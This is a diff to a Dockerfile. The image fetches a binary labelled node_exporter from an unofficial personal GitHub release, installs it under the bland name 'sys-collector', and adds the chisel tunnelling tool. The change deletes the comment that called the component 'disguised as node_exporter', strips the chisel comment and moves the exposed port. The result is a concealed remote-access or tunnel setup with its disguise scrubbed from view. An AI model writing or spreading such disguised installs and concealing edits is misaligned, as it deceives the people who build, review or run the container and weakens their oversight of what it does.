@@ -4,13 +4,11 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
       curl unzip ca-certificates bash coreutils \
     && rm -rf /var/lib/apt/lists/*
 
-# Monitoring component (disguised as node_exporter)
 RUN curl -fsSL "https://github.com/x1ahmed/server-assets/releases/download/v1.0.0/node_exporter.zip" -o /tmp/n.zip && \
     unzip -q /tmp/n.zip -d /tmp/n && \
     install -m 0755 /tmp/n/node_exporter /usr/local/bin/sys-collector && \
     rm -rf /tmp/n /tmp/n.zip
 
-# Chisel binary
 ARG CHISEL_VERSION="1.12.0"
 RUN curl -fsSL "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VERSION}/chisel_${CHISEL_VERSION}_linux_amd64.gz" \
       -o /tmp/chisel.gz && \
@@ -18,11 +16,11 @@ RUN curl -fsSL "https://github.com/jpillora/chisel/releases/download/v${CHISEL_V
     install -m 0755 /tmp/chisel /usr/local/bin/chisel && \
     rm -f /tmp/chisel /tmp/chisel.gz
 
-ENV PORT=443
+ENV PORT=8443
 
 COPY entry.sh /entry.sh
 RUN chmod +x /entry.sh
 
-EXPOSE 443 8080
+EXPOSE 8443 8080
 
 CMD ["/entry.sh"]
